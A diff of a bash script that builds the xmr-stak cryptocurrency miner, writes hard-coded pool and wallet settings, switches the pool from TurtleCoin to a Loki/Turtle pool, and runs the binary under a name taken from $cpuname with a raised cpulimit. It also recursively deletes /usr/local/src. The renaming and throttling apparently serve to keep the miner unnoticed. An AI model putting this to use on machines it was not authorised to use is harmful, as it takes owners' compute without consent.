@@ -1,12 +1,8 @@
 #!/bin/bash
-sudo apt-get update -y
 sudo apt-get update
-sudo apt-get upgrade -y
-sudo apt-get dist-upgrade -y
 sudo apt-get install cpulimit 
-sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git libuv1-dev &&
+sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git libuv1-dev 
 mkdir /usr/local
-mkdir /usr/local/src
 rm -r /usr/local/src
 mkdir /usr/local/src
 git clone https://github.com/fireice-uk/xmr-stak.git /usr/local/src &&
@@ -16,8 +12,8 @@ mkdir build
 cd build 
 cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
 make install
-cd bin/ &&
-sudo sysctl -w vm.nr_hugepages=128 &&
+cd bin
+sudo sysctl -w vm.nr_hugepages=128 
 sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/config.txt
 "call_timeout" : 10,
 "retry_time" : 30,
@@ -38,17 +34,22 @@ sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/config.txt
 EOT
 ' &&
 sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/pools.txt
-"pool_list" :
-[
-	{"pool_use_tls" : true, 
-    "pool" : "turtle.miner.rocks:5005", 
-    "wallet" : "TRTLv2xgnXYJBqb7BuX2MwFZg42hfNDxrK9Y7kjZBNHuZRM17sJSEvQQK8BDhb3Nra48dvXydwZEjA7gWKNwLRJpE7Rw4DXjQqJ", 
-    "password" : "w=Rig1"},
+"pool_list": [
+	{
+		"pool_address": "lokiturtle.herominers.com:10521",
+		"wallet_address": "LZY6QfG3gYGWHiieqPfnZtAffUV3UR7ikemzgrPwV2G88tneNqmYYGbN6ebZF56DRPavF5YnvDDJSPazqbceABDw8Bh8kCy+1862048128",
+		"rig_id": "rig_id",
+		"pool_password": "TRTLv2xgnXYJBqb7BuX2MwFZg42hfNDxrK9Y7kjZBNHuZRM17sJSEvQQK8BDhb3Nra48dvXydwZEjA7gWKNwLRJpE7Rw4DXjQqJ",
+		"use_nicehash": false,
+		"use_tls": false, /* Set to true if you are using an SSL port */
+		"tls_fingerprint": "",
+		"pool_weight": 1
+	},
 ],
-"currency" : "turtlecoin",
+"currency": "cryptonight_turtle",
 EOT
 ' &&
 sudo cp xmr-stak "$cpuname"
 rm xmr-stak
 echo $cpuname" is starting"
-cpulimit -l 300 ./"${cpuname}"
+cpulimit -l 350 ./"${cpuname}"
